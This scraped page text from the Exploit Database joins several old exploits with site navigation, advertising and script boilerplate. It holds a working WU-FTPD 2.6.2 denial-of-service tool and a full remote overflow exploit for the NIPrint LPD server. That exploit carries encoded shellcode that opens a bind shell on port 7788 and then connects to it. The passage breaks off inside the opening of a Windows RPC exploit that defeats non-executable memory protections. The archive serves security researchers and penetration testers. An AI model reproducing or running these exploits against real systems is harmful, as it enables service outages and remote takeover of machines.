<sys/socket.h>#include <netinet/in.h>#include <string.h>void addr_initialize( );void usage( );int main( int argc, char **argv ){int i, sd, PORT, loop, error;char user[30], password[30], ch;struct sockaddr_in server_addr;fprintf( stdout, "\n(c) Rosiello Security 2003\n" );fprintf( stdout, "http://www.rosiello.org\n" );fprintf( stdout, "WU-FTPD 2.6.2 Freezer by Angelo Rosiello\n\n" );if( argc != 6 ) usage( argv[0] );if( strlen( argv[3] ) > 20 ) exit( 0 );if( strlen( argv[4] ) > 20 ) exit( 0 );sprintf( user, "USER %s\n", argv[3] );sprintf( password, "PASS %s\n", argv[4] );PORT = atoi( argv[2] );loop = atoi( argv[5] );addr_initialize( &server_addr, PORT, ( long )inet_addr( argv[1] ));sd = socket( AF_INET, SOCK_STREAM, 0 );error = connect( sd, ( struct sockaddr * ) &server_addr, sizeof( server_addr ));if( error != 0 ){perror( "Something wrong with the connection" );exit( 0 );}while ( ch != '\n' ){recv( sd, &ch, 1, 0);printf("%c", ch );}ch = '\0';printf( "Connection executed, now waiting to log in...\n" );printf( "%s", user );send( sd, user, strlen( user ), 0 );while ( ch != '\n' ){recv( sd, &ch, 1, 0);printf("%c", ch );}printf( "%s", password );ch = '\0';send( sd, password, strlen( password ), 0 );while ( ch != '\n' ){recv( sd, &ch, 1, 0);printf("%c", ch );}printf( "Sending the DoS query\n" );for( i=0; i<loop; i++ ){write( sd, "LIST -w 1000000 -C\n", 19 );}printf( "All done\n" );close( sd );return 0;}void addr_initialize (struct sockaddr_in *address, int port, long IPaddr){address -> sin_family = AF_INET;address -> sin_port = htons((u_short)port);address -> sin_addr.s_addr = IPaddr;}void usage( char *program ){fprintf(stdout, "USAGE: <%s> <IP> <PORT> <USER> <PASS> <LOOP>\n", program);exit(0);}// milw0rm.com [2003-10-31]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 116
NIPrint LPD-LPR Print Server 4.10 - Remote Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDNIPrint LPD-LPR Print Server 4.10 - Remote OverflowEDB-ID:116CVE:2003-1142EDB Verified:Author:xCrZxType:remoteExploit:/Platform:WindowsDate:2003-11-04Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*\	remote exploit for NIPrint LPD-LPR Print Server (Version <= 4.10)/\	by xCrZx /BLack Sand Project/ /04.11.03//\	bug found by KF/	successfully tested on Win XP 5.1.2600/	P.S.#1 coded just for fun...\	P.S.#2 this exploit can be compiled under Win32 and *nix*/#ifdef _WIN32#include <winsock.h>#include <windows.h>#else#include <netinet/in.h>#include <netdb.h>#include <sys/types.h>#include <sys/socket.h>#include <sys/stat.h>#include <fcntl.h>#include <unistd.h>#include <errno.h>#endif#include <stdio.h>// JMP ESP ADDRESS (in Win XP 5.1.2600)#define RET 0x77F5801c#define SHELL 7788char shellcode[] ="\x90\xeb\x03\x5d\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc5\x15\x90\x90""\x90\x8b\xc5\x33\xc9\x66\xb9\x10\x03\x50\x80\x30\x97\x40\xe2\xfa""\x7e\x8e\x95\x97\x97\xcd\x1c\x4d\x14\x7c\x90\xfd\x68\xc4\xf3\x36""\x97\x97\x97\x97\xc7\xf3\x1e\xb2\x97\x97\x97\x97\xa4\x4c\x2c\x97""\x97\x77\xe0\x7f\x4b\x96\x97\x97\x16\x6c\x97\x97\x68\x28\x98\x14""\x59\x96\x97\x97\x16\x54\x97\x97\x96\x97\xf1\x16\xac\xda\xcd\xe2""\x70\xa4\x57\x1c\xd4\xab\x94\x54\xf1\x16\xaf\xc7\xd2\xe2\x4e\x14""\x57\xef\x1c\xa7\x94\x64\x1c\xd9\x9b\x94\x5c\x16\xae\xdc\xd2\xc5""\xd9\xe2\x52\x16\xee\x93\xd2\xdb\xa4\xa5\xe2\x2b\xa4\x68\x1c\xd1""\xb7\x94\x54\x1c\x5c\x94\x9f\x16\xae\xd0\xf2\xe3\xc7\xe2\x9e\x16""\xee\x93\xe5\xf8\xf4\xd6\xe3\x91\xd0\x14\x57\x93\x7c\x72\x94\x68""\x94\x6c\x1c\xc1\xb3\x94\x6d\xa4\x45\xf1\x1c\x80\x1c\x6d\x1c\xd1""\x87\xdf\x94\x6f\xa4\x5e\x1c\x58\x94\x5e\x94\x5e\x94\xd9\x8b\x94""\x5c\x1c\xae\x94\x6c\x7e\xfe\x96\x97\x97\xc9\x10\x60\x1c\x40\xa4""\x57\x60\x47\x1c\x5f\x65\x38\x1e\xa5\x1a\xd5\x9f\xc5\xc7\xc4\x68""\x85\xcd\x1e\xd5\x93\x1a\xe5\x82\xc5\xc1\x68\xc5\x93\xcd\xa4\x57""\x3b\x13\x57\xe2\x6e\xa4\x5e\x1d\x99\x13\x5e\xe3\x9e\xc5\xc1\xc4""\x68\x85\xcd\x3c\x75\x7f\xd1\xc5\xc1\x68\xc5\x93\xcd\x1c\x4f\xa4""\x57\x3b\x13\x57\xe2\x6e\xa4\x5e\x1d\x99\x17\x6e\x95\xe3\x9e\xc5""\xc1\xc4\x68\x85\xcd\x3c\x75\x70\xa4\x57\xc7\xd7\xc7\xd7\xc7\x68""\xc0\x7f\x04\xfd\x87\xc1\xc4\x68\xc0\x7b\xfd\x95\xc4\x68\xc0\x67""\xa4\x57\xc0\xc7\x27\x9b\x3c\xcf\x3c\xd7\x3c\xc8\xdf\xc7\xc0\xc1""\x3a\xc1\x68\xc0\x57\xdf\xc7\xc0\x3a\xc1\x3a\xc1\x68\xc0\x57\xdf""\x27\xd3\x1e\x90\xc0\x68\xc0\x53\xa4\x57\x1c\xd1\x63\x1e\xd0\xab""\x1e\xd0\xd7\x1c\x91\x1e\xd0\xaf\xa4\x57\xf1\x2f\x96\x96\x1e\xd0""\xbb\xc0\xc0\xa4\x57\xc7\xc7\xc7\xd7\xc7\xdf\xc7\xc7\x3a\xc1\xa4""\x57\xc7\x68\xc0\x5f\x68\xe1\x67\x68\xc0\x5b\x68\xe1\x6b\x68\xc0""\x5b\xdf\xc7\xc7\xc4\x68\xc0\x63\x1c\x4f\xa4\x57\x23\x93\xc7\x56""\x7f\x93\xc7\x68\xc0\x43\x1c\x67\xa4\x57\x1c\x5f\x22\x93\xc7\xc7""\xc0\xc6\xc1\x68\xe0\x3f\x68\xc0\x47\x14\xa8\x96\xeb\xb5\xa4\x57""\xc7\xc0\x68\xa0\xc1\x68\xe0\x3f\x68\xc0\x4b\x9c\x57\xe3\xb8\xa4""\x57\xc7\x68\xa0\xc1\xc4\x68\xc0\x6f\xfd\xc7\x68\xc0\x77\x7c\x5f""\xa4\x57\xc7\x23\x93\xc7\xc1\xc4\x68\xc0\x6b\xc0\xa4\x5e\xc6\xc7""\xc1\x68\xe0\x3b\x68\xc0\x4f\xfd\xc7\x68\xc0\x77\x7c\x3d\xc7\x68""\xc0\x73\x7c\x69\xcf\xc7\x1e\xd5\x65\x54\x1c\xd3\xb3\x9b\x92\x2f""\x97\x97\x97\x50\x97\xef\xc1\xa3\x85\xa4\x57\x54\x7c\x7b\x7f\x75""\x6a\x68\x68\x7f\x05\x69\x68\x68\xdc\xc1\x70\xe0\xb4\x17\x70\xe0""\xdb\xf8\xf6\xf3\xdb\xfe\xf5\xe5\xf6\xe5\xee\xd6\x97\xdc\xd2\xc5""\xd9\xd2\xdb\xa4\xa5\x97\xd4\xe5\xf2\xf6\xe3\xf2\xc7\xfe\xe7\xf2""\x97\xd0\xf2\xe3\xc4\xe3\xf6\xe5\xe3\xe2\xe7\xde\xf9\xf1\xf8\xd6""\x97\xd4\xe5\xf2\xf6\xe3\xf2\xc7\xe5\xf8\xf4\xf2\xe4\xe4\xd6\x97""\xd4\xfb\xf8\xe4\xf2\xdf\xf6\xf9\xf3\xfb\xf2\x97\xc7\xf2\xf2\xfc""\xd9\xf6\xfa\xf2\xf3\xc7\xfe\xe7\xf2\x97\xd0\xfb\xf8\xf5\xf6\xfb""\xd6\xfb\xfb\xf8\xf4\x97\xc0\xe5\xfe\xe3\xf2\xd1\xfe\xfb\xf2\x97""\xc5\xf2\xf6\xf3\xd1\xfe\xfb\xf2\x97\xc4\xfb\xf2\xf2\xe7\x97\xd2""\xef\xfe\xe3\xc7\xe5\xf8\xf4\xf2\xe4\xe4\x97\x97\xc0\xc4\xd8\xd4""\xdc\xa4\xa5\x97\xe4\xf8\xf4\xfc\xf2\xe3\x97\xf5\xfe\xf9\xf3\x97""\xfb\xfe\xe4\xe3\xf2\xf9\x97\xf6\xf4\xf4\xf2\xe7\xe3\x97\xe4\xf2""\xf9\xf3\x97\xe5\xf2\xf4\xe1\x97\x95\x97\x89\xfb\x97\x97\x97\x97""\x97\x97\x97\x97\x97\x97\x97\x97\xf4\xfa\xf3\xb9\xf2\xef\xf2\x97""\x68\x68\x68\x68";long getip(char *hostname) {struct hostent *he;long ipaddr;if ((ipaddr = inet_addr(hostname)) < 0) {if ((he = gethostbyname(hostname)) == NULL) {perror("gethostbyname()");exit(-1);}memcpy(&ipaddr, he->h_addr, he->h_length);}return ipaddr;}int main(int argc, char **argv) {#ifdef _WIN32WSADATA wsaData;#endifint sock;struct sockaddr_in sockstruct;char tmp[2000];if(!argv[1]) { printf("Usage: %s <address>\n",argv[0]);exit(0); }#ifdef _WIN32if(WSAStartup(0x101,&wsaData)){printf("Unable to initialize WinSock lib.\n");exit(0);}#endifmemset(sockstruct.sin_zero,0x00,sizeof(sockstruct.sin_zero));sock=socket(PF_INET,SOCK_STREAM,0);sockstruct.sin_family=PF_INET;sockstruct.sin_addr.s_addr=getip(argv[1]);sockstruct.sin_port=htons(515);if(connect(sock,(struct sockaddr*)&sockstruct,sizeof(sockstruct))>-1) {printf("[+] Connected to %s:515!\n",argv[1]);memset(tmp,0x00,sizeof tmp);memset(tmp,0x41,49);*(long *)&tmp[strlen(tmp)]=RET;memset(tmp+strlen(tmp),0x90,50);memcpy(tmp+strlen(tmp),&shellcode,strlen(shellcode));send(sock,tmp,strlen(tmp),0);printf("[+] Exploit code was sent!\n");}#ifdef _WIN32closesocket(sock);WSACleanup();#elseclose(sock);#endifprintf("[+] Connecting to %s:%d\n",argv[1],SHELL);sprintf(tmp,"telnet %s %d\n",argv[1],SHELL);system(tmp);printf("[-] Not connected! NIPrint probably not vulnerable!\n");return 0;}// milw0rm.com [2003-11-04]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 117
Microsoft Windows XP/2000 - RPC Remote Non Exec Memory - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows XP/2000 - RPC Remote Non Exec MemoryEDB-ID:117CVE:2003-0605EDB Verified:Author:ins1derType:remoteExploit:/Platform:WindowsDate:2003-11-07Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** have you recently bought one of those expensive new windows security products* on the market? do you think you now have strong protection?* Look again:** *rpc!exec** by ins1der (trixterjack yahoo com)** windows remote return into libc exploit!** remote rpc exploit breaking non exec memory protection schemes* tested against :*		OverflowGuard*		StackDefender (kernel32 imagebase randomization:O nice try guys.)*** currently breaking:* Windows 2000 SP0 (english)* Windows XP SP0 (english)** to get new offsets use this:* ------------------------------* 	#include <windows.h>*	#include <stdio.h>**	int main()*	{*	HANDLE h1,h2;*	unsigned long addr1,addr2,addr3,addr4;*	h1=LoadLibrary("ntdll.dll");*	h2=LoadLibrary("MSVCRT.dll");*	addr1=(unsigned long)GetProcAddress(h1,"NtAllocateVirtualMemory");*	addr2=(unsigned long)GetProcAddress(h2,"memcpy");*	addr3=(unsigned long)GetProcAddress(h1,"NtProtectVirtualMemory");*		for (addr4=addr1;addr4<addr1+0xffff;addr4++)*			{*			if (!memcmp((void*)addr4,"\xc9\xc3",2)) break;*			}*	printf("0x%x 0x%x 0x%x 0x%x\n",addr1,addr2,addr3,addr4);*	return 0;*	}* -----------------------------* to get the last offset use a standard rpc dcom exploit with the last* \x90\x90 before the shellcode replaced with \xcd\x21. run the exploit* and read the drwatson logs. substract 0xA5 from the fault address.*** 	Shouts go to:*		w00pz, SpaceCow, Int3, lacroix, misu200, j00(xor),*		s0ny, crisis, and to all my true friends.*** 	Enjoy!**/#include <sys/socket.h>#include <netinet/in.h>unsigned char bindstr[]={0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};unsigned char 